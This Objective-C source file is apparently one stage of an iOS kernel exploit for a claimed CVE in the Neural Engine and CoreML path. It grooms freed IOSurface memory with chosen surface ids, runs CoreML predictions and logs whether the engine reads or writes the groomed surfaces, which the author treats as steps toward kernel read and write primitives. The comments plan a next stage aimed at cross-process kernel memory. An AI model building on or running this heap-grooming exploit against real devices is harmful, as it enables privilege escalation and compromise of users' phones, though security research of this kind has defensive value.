//
//  P075AneKrw.m
//  P007OpenOnly — CVE-2026-43748 KRW probe v1 (SAFE stage).
//
//  Chain of evidence (all 2026-10-09):
//    - P073: armed x values appear 1:1 as kernel record sids (the confusion:
//      the fill reads STAGED INPUT CONTENT as the IOSurface id).
//    - v1/v2/v3: 127-in predict = fp16 sum of STAGED VALUES; bogus sid ->
//      y=inf (abort + CoreML CPU fallback). InitialChecks only rejects
//      sid==0. +2-3ms on All arms = kernel round trip. 128-in fails count
//      gate (129 with output).
//    - MemoryMapRequest processes OUTPUT records too ("Output IOSurface for
//      surface-Id: %d is NULL"). Working theory: the output record's sid =
//      the OUTPUT staging surface's recycled content (P074: garbage, so
//      every consume aborted at the output record).
//
//  P075 sequence (one tap, tests both groom orders):
//    1. Create 127 input surfaces (content fp32 1.0), capture surface
//       (marker 0x53), 2 groom windows of 64 surfaces.
//    2. CONTROL groom: fill groom[0..63] with u32 0, CFRelease them.
//       (sid 0 output record = guaranteed lookup abort -> fallback y.)
//    3. LOAD model — espresso allocates output staging HERE, so staging
//       recycles the freed zero pages if the staging hypothesis holds.
//    4. Predict C (control): y should be the fp16 staging fallback sum;
//       capture untouched.
//    5. REAL groom: fill groom[64..127] with u32 sid_C, CFRelease them.
//    6. Predict R1: if staging is re-allocated per predict (or consume
//       reads live allocator), output record sid = sid_C -> consume
//       completes -> y == surface-byte oracle.
//    7. Predict R2: stability check (staging persistence).
//
//  Oracles (fp32 1.0 in every input surface):
//    y == 127.0 exact -> ANE read OUR surfaces as fp32 (consume feeds the
//                        compute) — kernel READ door.
//    y == 0.0         -> ANE read surfaces as fp16 first-2-bytes (0x0000)
//                        — also a surface-read signal.
//    capture bytes changed -> ANE WROTE through the groomed output record
//                        — kernel WRITE primitive (own target).
//    y == fp16 staging chain / fallback -> consume still aborts.
//
//  Honesty: every target here is OUR surface. Foreign sids are Stage B and
//  gated on these results. Conversion bar (desc_type_forged OR
//  (body_forged AND kptr)) untouched. hasKread=NO hasKwrite=NO.
//  Isolation: ONE TAP per force-quit. Per-line POSIX write + F_FULLFSYNC.
//

#import "P075AneKrw.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P075_BUILD @"p075-krw-v2"

#define P075_N_IN        127u          /* count = 128 with output; gate 0x80 */
#define P075_MODEL       @"XVRC27_127in_1out"
#define P075_N_GROOM     128u          /* two windows of 64 */
#define P075_N_SURF      (P075_N_IN + 1u + P075_N_GROOM + 8u)  /* margin */

#define P075_CAP_MARK    0x53u

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p075_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p075_iosGetID_t)(IOSurfaceRef);
typedef void *(*p075_iosBase_t)(IOSurfaceRef);
typedef size_t (*p075_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p075_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p075_surf_t;

static int g_p075_fd = -1;
static NSMutableString *g_p075_buf;

static void p075_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P075AneKrw class]) {
        if (g_p075_buf) [g_p075_buf appendString:out];
        if (g_p075_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p075_fd, s, strlen(s));
                fcntl(g_p075_fd, F_FULLFSYNC);   /* panic-surviving flush per line */
            }
        }
    }
}

#pragma mark - IOSurface helpers

static p075_iosCreate_t  s_iosCreate;
static p075_iosGetID_t   s_iosGetID;
static p075_iosBase_t    s_iosBase;
static p075_iosAllocSz_t s_iosAllocSz;
static p075_iosLock_t    s_iosLock;
static p075_iosLock_t    s_iosUnlock;

static BOOL p075_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p075_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p075_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p075_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p075_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p075_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p075_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p075_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p075_surface_create(void) {
    CFNumberRef w = p075_cfnum(1), h = p075_cfnum(1);
    CFNumberRef bpe = p075_cfnum(4), fmt = p075_cfnum(0x42475241); /* BGRA */
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

/* fill entire surface with a repeating u32 pattern; returns bytes written */
static size_t p075_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return 0;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return 0;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
    return sz;
}

/* scan for any byte != expected u32 pattern; logs first diff bytes */
static BOOL p075_surface_scan_pattern(p075_surf_t *e, const char *label, uint32_t pattern) {
    if (!e->surf) return NO;
    void *base = s_iosBase(e->surf);
    if (!base) return NO;
    size_t sz = e->allocSize;
    if (sz == 0 || sz > (16UL << 20)) return NO;
    if (s_iosLock(e->surf, 0, NULL) != KERN_SUCCESS) return NO;
    const uint8_t *b = (const uint8_t *)base;
    const uint8_t exp[4] = { (uint8_t)(pattern & 0xff), (uint8_t)((pattern >> 8) & 0xff),
                             (uint8_t)((pattern >> 16) & 0xff), (uint8_t)((pattern >> 24) & 0xff) };
    uint8_t first[16];
    memset(first, 0, sizeof(first));
    memcpy(first, b, sizeof(first));
    size_t diffOff = sz;
    uint32_t diffCnt = 0;
    for (size_t k = 0; k < sz; k++) {
        if (b[k] != exp[k & 3]) { if (diffOff == sz) diffOff = k; diffCnt++; if (diffCnt >= 256) break; }
    }
    s_iosUnlock(e->surf, 0, NULL);
    if (diffOff != sz) {
        p075_log(@"  [!] %s TOUCHED sid=%u first diff at +0x%zx (>= %u bytes)",
                 label, e->sid, diffOff, diffCnt);
        p075_log(@"      first16 %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                 first[0], first[1], first[2], first[3], first[4], first[5],
                 first[6], first[7], first[8], first[9], first[10], first[11],
                 first[12], first[13], first[14], first[15]);
        return YES;
    }
    return NO;
}

/* exact double sum of armed sid values (fp16 chain lands near this for
   large values; EXACTLY 127.0 for the fp32-1.0 arm — integers < 2048) */
static double p075_sum_sids(p075_surf_t *arr, uint32_t first, uint32_t n) {
    double sum = 0.0;
    for (uint32_t i = first; i < first + n; i++) sum += (double)arr[i].sid;
    return sum;
}

#pragma mark - CoreML

static NSURL *p075_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p075_load(NSURL *url, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = MLComputeUnitsAll;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p075_provider(p075_surf_t *arr, uint32_t nSurf,
                                                  NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < P075_N_IN; i++) {
        if (i >= nSurf) return nil;
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                     dataType:MLMultiArrayDataTypeDouble
                                                        error:nil];
        if (!m) return nil;
        m[0] = @( (double)arr[i].sid );
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

/* one predict; returns y or NAN */
static double p075_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p075_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

static void p075_verdict_head(void) {
    p075_log(@"=== VERDICT ===");
}

@implementation P075AneKrw

+ (NSString *)tap {
    g_p075_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p075_ane_krw_log.txt"];
    g_p075_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p075_log(@"=== p075 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P075_BUILD);
    p075_log(@"43748 KRW v2: pre-load groom carries sid_C. v1 lesson: each predict's y");
    p075_log(@"OVERWRITES the output staging content, so a post-load groom window is");
    p075_log(@"dead — the only live window is BEFORE model load (v1 proved the zero-");
    p075_log(@"window = fallback y=3.5808e4 on tap 259816352). Inputs filled fp32 1.0");
    p075_log(@"-> y==127.0 exact = ANE reads OUR surfaces (read door); capture bytes");
    p075_log(@"changed = ANE wrote the groomed target (write door). All targets OUR");
    p075_log(@"surfaces; foreign sids = Stage B.");
    p075_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p075"];
    if (stop) {
        p075_log(@"%@", stop);
        if (g_p075_fd >= 0) { fcntl(g_p075_fd, F_FULLFSYNC); close(g_p075_fd); g_p075_fd = -1; }
        NSString *ret = g_p075_buf; g_p075_buf = nil; return ret;
    }
    p075_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p075_resolve_iosurface()) {
        p075_log(@"[-] IOSurface dlsym FAILED — abort");
        p075_verdict_head();
        p075_log(@"abort (iosurface). hasKread=NO hasKwrite=NO.");
        if (g_p075_fd >= 0) { fcntl(g_p075_fd, F_FULLFSYNC); close(g_p075_fd); g_p075_fd = -1; }
        NSString *ret = g_p075_buf; g_p075_buf = nil; return ret;
    }

    /* ---- surfaces ---- */
    p075_surf_t *surfs = calloc(P075_N_SURF, sizeof(p075_surf_t));
    uint32_t made = 0;
    for (uint32_t i = 0; i < P075_N_SURF; i++) {
        IOSurfaceRef s = p075_surface_create();
        if (!s) { p075_log(@"  surf[%u] create FAILED", i); continue; }
        surfs[made].surf = s;
        surfs[made].sid = s_iosGetID(s);
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p075_log(@"[+] surfaces: %u/%u (127 inputs + 1 capture + %u groom + margin)",
             made, P075_N_SURF, P075_N_GROOM);
    if (made < P075_N_IN + 1 + P075_N_GROOM) {
        p075_log(@"[-] not enough surfaces — abort");
        p075_verdict_head();
        p075_log(@"abort (surfaces). hasKread=NO hasKwrite=NO.");
        if (g_p075_fd >= 0) { fcntl(g_p075_fd, F_FULLFSYNC); close(g_p075_fd); g_p075_fd = -1; }
        NSString *ret = g_p075_buf; g_p075_buf = nil; return ret;
    }
    uint32_t nIn = P075_N_IN;
    p075_surf_t *cap = &surfs[nIn];                 /* capture = index 127 */
    p075_surf_t *groom = &surfs[nIn + 1];           /* groom = 128..255 */
    p075_surf_t *in = surfs;                        /* inputs = 0..126 */

    /* input surfaces: fp32 1.0 pattern (00 00 80 3F repeating) */
    uint32_t ones = 0x3F800000u;   /* fp32 1.0 little-endian bytes 00 00 80 3F */
    for (uint32_t i = 0; i < nIn; i++) {
        size_t w = p075_surface_fill_u32(in[i].surf, ones);
        if (i == 0) p075_log(@"  in[0] sid=%u fill fp32-1.0 wrote %zu bytes", in[i].sid, w);
    }
    /* capture: marker 0x53 */
    p075_surface_fill_u32(cap->surf, 0x53535353u);
    p075_log(@"[+] capture sid=%u marker 0x%02x; input sids %u..%u (armed as x values)",
             cap->sid, P075_CAP_MARK, in[0].sid, in[nIn - 1].sid);

    /* ---- PRE-LOAD groom: sid_C pattern into the staging recycle window ---- */
    p075_log(@">>> GROOM: fill %u surfaces u32=sid_C=0x%08x, release (pre-load window)",
             P075_N_GROOM, cap->sid);
    for (uint32_t i = 0; i < P075_N_GROOM; i++) {
        p075_surface_fill_u32(groom[i].surf, cap->sid);
    }
    for (uint32_t i = 0; i < P075_N_GROOM; i++) { CFRelease(groom[i].surf); groom[i].surf = NULL; }

    /* ---- load model: espresso allocates output staging HERE ---- */
    NSURL *url = p075_model_url(P075_MODEL);
    NSError *err = nil;
    MLModel *model = p075_load(url, &err);
    if (!model) {
        p075_log(@"[-] load FAILED: %@", err.localizedDescription ?: @"-");
        p075_verdict_head();
        p075_log(@"abort (load). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p075_fd >= 0) { fcntl(g_p075_fd, F_FULLFSYNC); close(g_p075_fd); g_p075_fd = -1; }
        NSString *ret = g_p075_buf; g_p075_buf = nil; return ret;
    }
    p075_log(@"[+] %@ loaded (computeUnits=All) — staging allocation window closed", P075_MODEL);

    MLDictionaryFeatureProvider *fp = p075_provider(surfs, made, &err);
    if (!fp) {
        p075_log(@"[-] provider FAILED: %@", err.localizedDescription ?: @"-");
        p075_verdict_head();
        p075_log(@"abort (provider). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p075_fd >= 0) { fcntl(g_p075_fd, F_FULLFSYNC); close(g_p075_fd); g_p075_fd = -1; }
        NSString *ret = g_p075_buf; g_p075_buf = nil; return ret;
    }
    double stagingSum = p075_sum_sids(in, 0, nIn);
    p075_log(@"[+] hypotheses: SURFACE fp32-read y=127.0 exact | fp16-first2-read y=0.0 |");
    p075_log(@"    staging-sum~%.4e (fp16 chain) | fallback after abort = fp16 staging chain",
             stagingSum);

    /* ---- predict R1 / R2 (R1 = first predict on this model instance) ---- */
    NSTimeInterval d1 = 0, d2 = 0;
    double y1 = p075_predict(model, fp, &d1, &err);
    BOOL cap1 = p075_surface_scan_pattern(cap, "capture(R1)", 0x53535353u);
    p075_log(@"[*] R1 y=%@ t=%.1fms captureTouched=%d", p075_yfmt(y1), d1 * 1000.0, cap1);

    double y2 = p075_predict(model, fp, &d2, &err);
    BOOL cap2 = p075_surface_scan_pattern(cap, "capture(R2)", 0x53535353u);
    p075_log(@"[*] R2 y=%@ t=%.1fms captureTouched=%d", p075_yfmt(y2), d2 * 1000.0, cap2);

    /* input surfaces must be unchanged (read-only) — verify one */
    BOOL inTouched = p075_surface_scan_pattern(in, "in[0](R2)", 0x3F800000u);
    p075_log(@"[*] in[0] touched=%d (expected NO — inputs are read-only)", inTouched);

    /* ---- verdict ---- */
    p075_verdict_head();
    BOOL doorRead = ((y1 == 127.0) || (y1 == 0.0) ||
                     (y2 == 127.0) || (y2 == 0.0));
    BOOL doorWrite = (cap1 || cap2);

    if (doorWrite) {
        p075_log(@"WRITE DOOR OPEN: capture surface WRITTEN through the groomed output");
        p075_log(@"record (sid_C consumed, ANE DMA write). Own-surface target this tap.");
        p075_log(@"NEXT: Stage B — groom with a FOREIGN sid (IOSurfaceLookup-enumerated or");
        p075_log(@"M2Scaler KVA candidate) = cross-process kernel write. hasKwrite pending.");
        [[P007Board shared] recordEvent:@"p075_session" kind:@"write_door"
                                 detail:@"capture written via groomed output record"
                                 source:@"p075"];
    }
    if (doorRead) {
        p075_log(@"READ DOOR OPEN: y == surface-byte oracle — ANE read OUR input surfaces");
        p075_log(@"through the consumed records. Stage B: arm ONE foreign sid among");
        p075_log(@"zero-filled inputs -> y = foreign bytes = kernel read value.");
        [[P007Board shared] recordEvent:@"p075_session" kind:@"read_door"
                                 detail:[NSString stringWithFormat:@"y1=%.6e y2=%.6e", y1, y2]
                                 source:@"p075"];
    }
    if (!doorRead && !doorWrite) {
        p075_log(@"No door this tap: R1 y=%@ | R2 y=%@ — all fallback shape.",
                 p075_yfmt(y1), p075_yfmt(y2));
        p075_log(@"Meaning: output record sid still garbage — staging is either not");
        p075_log(@"IOSurface-backed, not recycled from our freed pages, or the output");
        p075_log(@"fill does not read staging content at all. v3 levers: Ghidra the");
        p075_log(@"caller that builds the proc/param_2 sid fields (who writes the");
        p075_log(@"lookup sid?), Dopamine-style IOSurfaceAllocSize groom, or craft the");
        p075_log(@"sid via y itself (fp16-sum chaining into a chosen u32).");
        [[P007Board shared] recordEvent:@"p075_session" kind:@"miss"
                                 detail:@"no read no write door" source:@"p075"];
    }
    p075_log(@"Honesty: all targets our own surfaces; foreign transfer not yet measured.");
    p075_log(@"Conversion bar (desc_type_forged OR (body_forged AND kptr)) untouched.");
    p075_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh surfaces next tap.");

    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);

    if (g_p075_fd >= 0) { fcntl(g_p075_fd, F_FULLFSYNC); close(g_p075_fd); g_p075_fd = -1; }
    NSString *ret = g_p075_buf;
    g_p075_buf = nil;
    return ret;
}

@end